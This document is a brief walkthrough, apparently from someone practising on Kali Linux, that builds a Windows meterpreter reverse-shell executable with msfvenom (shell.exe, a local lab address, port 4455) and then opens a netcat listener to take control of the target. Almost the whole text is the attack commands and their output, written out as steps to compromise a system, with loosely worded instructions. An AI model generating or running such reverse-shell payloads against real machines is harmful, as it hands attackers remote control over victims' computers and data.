# Create payload
 
 create the payload to vernabul the system                                                                                                                   
                                                                                                                    
                                                                                                                    
```                                                                                                                                                                                                                                 
┌──(kali㉿kali)-[~]
└─$ ls
 Downloads   myenv          Public             tgpt                  Videos
 Desktop               go          Pictures       rakuten_subs.txt   Sublist3r
 Documents             Music       profiles.csv   shell_gpt          Templates       venv
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.133.128 lport=4455 -f exe -o shell.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

After creat the pay load to connection see in the target host and conntrol with the **netcat**

```                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ ls
'Browse Anonymously'   Downloads   myenv          Public             shell_gpt       Templates             venv
 Desktop               go          Pictures       rakuten_subs.txt   shell-gpt-env   tgpt                  Videos
 Documents             Music       profiles.csv   shell.exe          Sublist3r       tor-browser.desktop
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ nc -lvp 4455            
listening on [any] 4455 ...

```




